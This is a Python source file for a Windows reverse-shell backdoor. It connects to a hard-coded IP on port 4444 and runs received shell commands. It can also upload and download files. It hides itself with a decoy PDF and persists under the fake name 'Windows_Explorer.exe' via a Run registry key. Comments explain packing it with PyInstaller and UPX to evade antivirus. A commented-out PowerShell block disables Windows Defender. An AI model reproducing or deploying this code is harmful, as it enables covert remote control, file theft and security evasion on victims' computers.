#!/usr/bin/env python3
# windows with python3 and pyinstaller(if attacking from windows that is) command below
# C:\Users\User\AppData\Local\Programs\Python\Python311\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --no-console
# use upx to compress exe files to be less detected by anti-virus
import shutil
import socket, subprocess, json, os, base64, sys


# todolater
# powershell_command = """
# Set-MpPreference -DisableRealtimeMonitoring $true;
# Set-MpPreference -DisableBehaviorMonitoring $true;
# Set-MpPreference -DisableIOAVProtection $true;
# Set-MpPreference -DisableScriptScanning $true;
# Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" -Name "DisableAntiSpyware" -Value 1;
# shutdown -r -t 0
# """

# os.system(f'powershell -Command "{powershell_command}"')

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistant()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        return subprocess.check_output(' '.join(command), shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    @staticmethod
    def change_working_directory_to(path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    @staticmethod
    def become_persistant():
        evil_file_location = os.environ["appdata"] + "\\Windows_Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.168.119.139", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()